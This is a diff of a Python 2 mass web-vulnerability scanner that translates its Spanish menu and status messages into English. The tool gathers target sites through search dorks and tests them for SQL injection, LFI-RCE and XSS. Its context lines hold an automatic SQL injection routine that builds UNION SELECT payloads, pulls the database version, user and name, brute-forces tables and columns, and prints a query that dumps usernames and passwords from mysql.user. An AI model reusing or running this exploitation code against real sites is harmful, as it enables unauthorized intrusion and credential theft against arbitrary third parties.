@@ -200,7 +200,7 @@ def execute():
 	
 	    except:
 	      pass
-	  print "[+] URLS (ordenadas)  : ",len(finallist)
+	  print "[+] URLS (sorted)  : ",len(finallist)
 	  return finallist
  
   
@@ -332,9 +332,9 @@ def execute():
 	      pass
  
 	def injtest():
-	  print B+"\n[+] Preparando escaneo  SQLi ..."
+	  print B+"\n[+] Preparing for SQLi scanning ..."
 	  print "[+] Can take a while ..."
-	  print "[!] Procesando ...\n"
+	  print "[!] Working ...\n"
 	  i = len(usearch) / int(numthreads)
 	  m = len(usearch) % int(numthreads)
 	  z = 0
@@ -351,9 +351,9 @@ def execute():
 	      thread.join()
       
 	def lfitest():
-	  print B+"\n[+] Preparando escaneo LFI - RCE ..."
-	  print "[+] Puede tomar un tiempo ..."
-	  print "[!] Procesando ...\n"
+	  print B+"\n[+] Preparing for LFI - RCE scanning ..."
+	  print "[+] Can take a while ..."
+	  print "[!] Working ...\n"
 	  i = len(usearch) / int(numthreads)
 	  m = len(usearch) % int(numthreads)
 	  z = 0
@@ -370,9 +370,9 @@ def execute():
 	      thread.join()
  
 	def xsstest():
-	  print B+"\n[+] Preparando escaneo XSS ..."
-	  print "[+] Puede tomar un tiempo ..."
-	  print "[!] Procesando ...\n"
+	  print B+"\n[+] Preparing for XSS scanning ..."
+	  print "[+] Can take a while ..."
+	  print "[!] Working ...\n"
 	  i = len(usearch) / int(numthreads)
 	  m = len(usearch) % int(numthreads)
 	  z = 0
@@ -402,10 +402,10 @@ def execute():
 	    for k,v in domains.items():
 	      stecnt += 1
 	      print str(stecnt)+" - "+k
-	    sitekey = raw_input("\nElige tu objetivo  (Si no lo entiendes selecciona Default) :  ")
+	    sitekey = raw_input("\nChoose your target  (if you don't know choose default) :  ")
 
 	    if sitekey == "5":
-	      sitedomain = raw_input("\nElige tu dominio especifico (ej. fr or com...) Para multipes dominios separa con comas :  ")
+	      sitedomain = raw_input("\nChoose the specifics domain (e.g. fr or com...) for multiples domains separe with commas :  ")
 	      if "," in sitedomain:
 	        site = sitedomain.split(',')
 	        sitearray = site
@@ -416,34 +416,34 @@ def execute():
 	      sitearray = domains[domains.keys()[int(sitekey)-1]]
     
  
-	    inurl = raw_input('\nIngresa tu dork      : ')
-	    numthreads = raw_input('Ingresa no. de threads : ')
+	    inurl = raw_input('\nEnter your dork      : ')
+	    numthreads = raw_input('Enter no. of threads : ')
 	    maxc = raw_input('Enter no. of pages   : ')
-	    print "\nNumero de errores SQL :",len(sqlerrors)
-	    print "Numero de LFI paths  :",len(lfis)
-	    print "Numero de XSS cheats :",len(xsses)
-	    print "Numero de headers    :",len(header)
-	    print "Numero de threads    :",numthreads
-	    print "Numero de paginas      :",maxc
-	    print "Tiempo de expiracion en segundos   :",timeout
+	    print "\nNumber of SQL errors :",len(sqlerrors)
+	    print "Number of LFI paths  :",len(lfis)
+	    print "Number of XSS cheats :",len(xsses)
+	    print "Number of headers   :",len(header)
+	    print "Number of threads     :",numthreads
+	    print "Number of pages      :",maxc
+	    print "Timeout in seconds   :",timeout
 	    print ""
   
 	    usearch = search(inurl,maxc)
 	    new = 0
   
-	  print R+"\n[0] Saliendo"
-	  print "[1] Prueba SQLi "
-	  print "[2] Prueba modo automatico SQLi "
-	  print "[3] Prueba LFI - RCE "
-	  print "[4] Prueba XSS"
-	  print "[5] Prueba SQLi & LFI - RCE"
-	  print "[6] Prueba SQLi & XSS"
-	  print "[7] Prueba LFI - RCE & XSS"
-	  print "[8] Prueba SQLi,LFI - RCE & XSS"
-	  print "[9] Guardar URL's validas en un archivo"
-	  print "[10] Mostrar urls validas"
-	  print "[11] Vuln encontradas en el ultimo escaneo"
-	  print "[12] Nuevo escaneo\n"
+	  print R+"\n[0] Exit"
+	  print "[1] SQLi Testing "
+	  print "[2] SQLi Testing Auto Mode "
+	  print "[3] LFI - RCE Testing "
+	  print "[4] XSS Testing"
+	  print "[5] SQLi and LFI - RCE Testing"
+	  print "[6] SQLi and XSS Testing"
+	  print "[7] LFI - RCE and XSS Testing"
+	  print "[8] SQLi,LFI - RCE and XSS Testing"
+	  print "[9] Save valid urls to file"
+	  print "[10] Print valid urls"
+	  print "[11] Found vuln in last scan"
+	  print "[12] New Scan\n"
   
 	  chce = raw_input(":")
 	  if chce == '1':
@@ -451,13 +451,13 @@ def execute():
     
 	  if chce == '2':
 	    injtest()
-	    print B+"\n[+] Buscando Columnas ..."
-	    print "[+] Puede tomar un tiempo ..."
-	    print "[!] Preparando ..."
+	    print B+"\n[+] Preparing for Column Finder ..."
+	    print "[+] Can take a while ..."
+	    print "[!] Working ..."
  	    for host in col:
 	      print R+"\n[+] Target: ", O+host
-	      print R+"[+] Intentando encontrar numero de columnas ..."
-	      print "[+] Probando: ",
+	      print R+"[+] Attempting to find the number of columns ..."
+	      print "[+] Testing: ",
 	      checkfor = []
 	      host = host.rsplit("'", 1)[0]
 	      sitenew = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva
@@ -477,7 +477,7 @@ def execute():
 		  for y in checkfor:
 		    colFound = re.findall(y, source)
 		    if len(colFound) >= 1:
-		      print "\n[+] Longitud de columna:", len(checkfor)
+		      print "\n[+] Column length is:", len(checkfor)
 		      nullcol = re.findall(("\d+"), y)
 		      print "[+] Found null column at column #:", nullcol[0]
 		      for z in xrange(0, len(checkfor)):
@@ -491,7 +491,7 @@ def execute():
 		      site = site.replace(","+nullcol[0],",hanom1960")
 		      print "[+] hanom1960 URL:", site
 		      darkurl.append(site)
-		      print "[-] Hecho!\n"
+		      print "[-] Done!\n"
 		      break
 	      
 		except(KeyboardInterrupt, SystemExit):
@@ -499,12 +499,12 @@ def execute():
 		except:
 		  pass
       
-	      print "\n[!] Disculpa la longitud de la columna no pudo encontrarce u.u\n"
+	      print "\n[!] Sorry column length could not be found u.u\n"
       
       
       #########
     
-	    print B+"\n[+] Reuniendo configuracion del Servidor MySQL..."
+	    print B+"\n[+] Gathering MySQL Server Configuration..."
 	    for site in darkurl:
 	      head_URL = site.replace("hanom1960", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
 	      print R+"\n[+] Target:", O+site
@@ -537,9 +537,9 @@ def execute():
 		    if re.findall("hanom1960", source):
 		      print "\n[!] w00t!w00t!: "+site.replace("hanom1960", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
 	  
-		  print W+"\n[+] Numero de Tablas:",len(tables)
-		  print "[+] Numero de columnas:",len(columns)
-	          print "[+] Verificando tablas y columnas..."
+		  print W+"\n[+] Tables Number:",len(tables)
+		  print "[+] Columns number:",len(columns)
+	          print "[+] checking tables & columns ..."
 	          target = site.replace("hanom1960", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
 		  for table in tables:
 	            try:
@@ -547,26 +547,26 @@ def execute():
 		      source = urllib2.urlopen(target_table).read()
 		      search = re.findall("hanom1960", source)
 		      if len(search) > 0:
-			print "\n[!] w00t!w00t! Tabla encontrada: < "+table+" >"
-			print "\n[+] Busquemos columnas detro la tabla < "+table+" >"
+			print "\n[!] w00t!w00t! Table found: < "+table+" >"
+			print "\n[+] Search columns inside the table < "+table+" >"
 			for column in columns:
 			  try:
 			    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
 			    search = re.findall("hanom1960", source)
 			    if len(search) > 0:
-			      print "\t[!] w00t!w00t! Columna Encontrada: < "+column+" >"
+			      print "\t[!] w00t!w00t! Column found: < "+column+" >"
 			  except(KeyboardInterrupt, SystemExit):
 			    raise
 			  except(urllib2.URLErrr, socket.gaierror, socket.error, socket.timeout):
 			    pass
 	    
-			print "\n[-] Hecho buscando columnas dentro la tabla < "+table+" >!"
+			print "\n[-] Done looking for columns inside the table< "+table+" >!"
 		  
 		    except(KeyboardInterrupt, SystemExit):
 		      raise
 		    except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
 		      pass
-		  print "[!] Listo!"
+		  print "[!] Done!"
 		  break	  
 		except(KeyboardInterrupt, SystemExit):
 		  raise
@@ -599,30 +599,30 @@ def execute():
 	    xsstest()
     
 	  if chce == '9':
-	    print B+"\nGuardando URL's validas ("+str(len(finallist))+")en el archivo"
+	    print B+"\nSaving valid URL's ("+str(len(finallist))+")on the file"
 	    listname = raw_input("Filename: ")
 	    list_name = open(listname, "w")
 	    finallist.sort()
 	    for t in finallist:
 	      list_name.write(t+"\n")
 	    list_name.close()
-	    print "Url's Listas, Verifique por favor", listname
+	    print "Url's ready, Verify please", listname
    
 	  if chce == '10':
-	    print W+"\nPrint URL's validas:\n"
+	    print W+"\nPrint valid URL's:\n"
 	    finallist.sort()
 	    for t in finallist:
 	      print B+t
       
 	  if chce == '11':
-	    print B+"\nVuln encontrada ",len(vuln)
+	    print B+"\nVuln found ",len(vuln)
     
 	  if chce == '12':
 	    new = 1 
 	    print W+""
  
 	  if chce == '0':
-	    print R+"\n[-] Saliendo ..."
+	    print R+"\n[-] Exiting ..."
 	    menu = False
 	    print W
 	    sys.exit(1)
